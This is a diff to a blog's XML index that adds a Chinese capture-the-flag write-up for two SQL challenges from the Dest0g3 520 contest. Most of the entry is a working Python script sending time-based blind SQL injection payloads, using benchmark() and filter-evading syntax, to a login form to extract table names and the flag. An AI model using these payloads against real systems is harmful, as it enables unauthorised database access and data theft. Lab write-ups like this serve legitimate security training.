@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Dest0g3 520迎新赛两道SQL</title>
+      <link href="/2022/07/14/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B%E4%B8%A4%E9%81%93SQL/"/>
+      <url>/2022/07/14/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B%E4%B8%A4%E9%81%93SQL/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Dest0g3-520迎新赛两道SQL"><a href="#Dest0g3-520迎新赛两道SQL" class="headerlink" title="Dest0g3 520迎新赛两道SQL"></a>Dest0g3 520迎新赛两道SQL</h1><h2 id="Really-Easy-SQL"><a href="#Really-Easy-SQL" class="headerlink" title="Really Easy SQL"></a>Really Easy SQL</h2><p>不管输入什么页面都回显一个信息有误，可以考虑延时注入。过滤sleep，substr，空格等。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://81e5fe2b-9fa9-454d-90b8-14ce7016a589.node4.buuoj.cn:81/"</span><span class="token keyword">def</span> <span class="token function">SQL_injection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mid<span class="token operator">=</span><span class="token number">32</span>        <span class="token keyword">while</span> mid<span class="token operator">&lt;</span><span class="token number">128</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#payload="'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'"%(i,mid)</span>            <span class="token comment" spellcheck="true">#database()=ctf</span>            <span class="token comment" spellcheck="true">#payload="'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'"%(i,mid)</span>            <span class="token comment" spellcheck="true">#flaggg,user</span>            <span class="token comment" spellcheck="true">#payload="'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'"%(i,mid)</span>            <span class="token comment" spellcheck="true">#cmd</span>            payload<span class="token operator">=</span><span class="token string">"'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            begin_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">}</span>            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            end_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(end_time-begin_time)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>end_time<span class="token operator">-</span>begin_time<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>                res<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>                <span class="token keyword">break</span>            mid<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    SQL_injection<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>同exp。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> benchmark型SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2022Dest0g3 520迎新赛web复现【EasySSTI-NodeSoEasy】</title>
       <link href="/2022/07/08/2022Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/"/>
       <url>/2022/07/08/2022Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/</url>
